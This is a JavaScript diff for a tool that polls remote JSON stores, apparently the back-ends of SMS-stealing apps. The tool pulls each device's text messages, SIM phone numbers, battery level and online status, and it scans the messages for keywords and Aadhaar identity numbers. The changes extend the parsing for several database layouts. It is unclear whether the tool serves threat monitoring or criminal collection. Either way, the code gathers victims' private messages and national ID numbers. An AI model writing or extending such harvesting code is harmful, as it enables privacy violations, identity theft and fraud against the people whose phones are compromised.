@@ -343,7 +343,14 @@ function parseSms(dsms, schema) {
       ts = Number(msg.timestamp || msg.timestampMillis) || 0;
     } else {
       body = String(msg.body || msg.message || msg.msg || msg.text || '');
-      ts = Number(msg.timestampMillis || msg.timestamp) || 0;
+      // Try numeric timestamp fields first, then parse receivedDate / date strings
+      const rawTs = msg.timestampMillis || msg.timestamp;
+      if (rawTs) {
+        ts = Number(rawTs) || 0;
+      } else if (msg.receivedDate || msg.dateReceived || msg.date_received) {
+        // "2026-05-25 12:29:50" or similar
+        try { ts = new Date(msg.receivedDate || msg.dateReceived || msg.date_received).getTime() || 0; } catch {}
+      }
     }
 
     const lower = body.toLowerCase();
@@ -365,13 +372,13 @@ function parseSms(dsms, schema) {
 }
 
 // ── Schemas that need per-device SMS fetch (not inline in main endpoint) ──────
-// Schema 2,4,5: SMS at /messages/<did>.json
+// Schema 2,5: SMS at /messages/<did>.json
 // Schema 3,6: SMS at /user_sms/<did>.json
-// Schema 1: SMS is inline at data.sms in /All_Users.json — NO per-device fetch needed
-const NEEDS_PER_DEVICE_SMS = new Set([2, 3, 4, 5, 6]);
+// Schema 4: SMS is INLINE inside clients[did].messages — NO separate fetch
+const NEEDS_PER_DEVICE_SMS = new Set([2, 3, 5, 6]);
 
 function getSmsEndpoint(url, schema, did) {
-  if (schema === 2 || schema === 4 || schema === 5) return `${url}/messages/${did}.json`;
+  if (schema === 2 || schema === 5) return `${url}/messages/${did}.json`;
   return `${url}/user_sms/${did}.json`;
 }
 
@@ -472,6 +479,8 @@ async function pollTarget(target) {
       }
       // Schema 13: SMS is nested under receivedSms key inside the device record
       if (schema === 13) dsms = dinfo.receivedSms || {};
+      // Schema 4: messages are INLINE inside clients[did].messages
+      if (schema === 4) dsms = dinfo.messages || {};
 
       const { actStr, foundKws, foundAadhars, maxTs } = parseSms(dsms, schema);
 
@@ -506,27 +515,24 @@ async function pollTarget(target) {
         const bv = dinfo.battery;
         bat   = bv != null && bv !== 'N/A' ? (String(bv).endsWith('%') ? String(bv) : `${bv}%`) : 'N/A';
         brand = dinfo.d_name || 'Unknown';
-        const luTs9 = Number(dinfo.lastUpdated || dinfo.timestamp || 0);
-        const bestTs9 = Math.max(maxTs, luTs9);
-        isOn  = dinfo.status === 'online' || (bestTs9 > 0 && (Date.now() - bestTs9) < STALE_MS);
+        isOn  = dinfo.status === 'online' || (maxTs > 0 && (Date.now() - maxTs) < STALE_MS);
 
       } else if (schema === 2 || schema === 4) {
         const sims = dinfo.sims || [];
         s1    = sims[0]?.phoneNumber || dinfo.mobNo || 'N/A';
         s2    = sims[1]?.phoneNumber || 'N/A';
         bat   = dinfo.battery != null ? String(dinfo.battery) : 'N/A';
-        brand = dinfo.modelName || 'Unknown';
-        isOn  = dinfo.status === true || dinfo.status === 'online' || (maxTs > 0 && (Date.now() - maxTs) < STALE_MS);
+        brand = dinfo.modelName || dinfo.brand || dinfo.label || 'Unknown';
+        // Schema 4: status is boolean (true = online); schema 2: 'online'/'true'
+        isOn  = dinfo.status === true || dinfo.status === 'online' || dinfo.status === 'Online'
+                || (maxTs > 0 && (Date.now() - maxTs) < STALE_MS);
 
       } else if (schema === 3 || schema === 6) {
         s1    = dinfo.numberSim1 || dinfo.phoneNumber || 'N/A';
         s2    = dinfo.numberSim2 || 'N/A';
         bat   = dinfo.battery != null ? `${dinfo.battery}%` : 'N/A';
         brand = dinfo.d_name || 'Unknown';
-        // lastUpdated is epoch-ms of last device heartbeat — more reliable than SMS ts
-        const luTs = Number(dinfo.lastUpdated || dinfo.timestamp || 0);
-        const bestTs = Math.max(maxTs, luTs);
-        isOn  = dinfo.status === 'online' || (bestTs > 0 && (Date.now() - bestTs) < STALE_MS);
+        isOn  = dinfo.status === 'online' || (maxTs > 0 && (Date.now() - maxTs) < STALE_MS);
 
       } else if (schema === 5) {
         const info = dinfo.info || {};
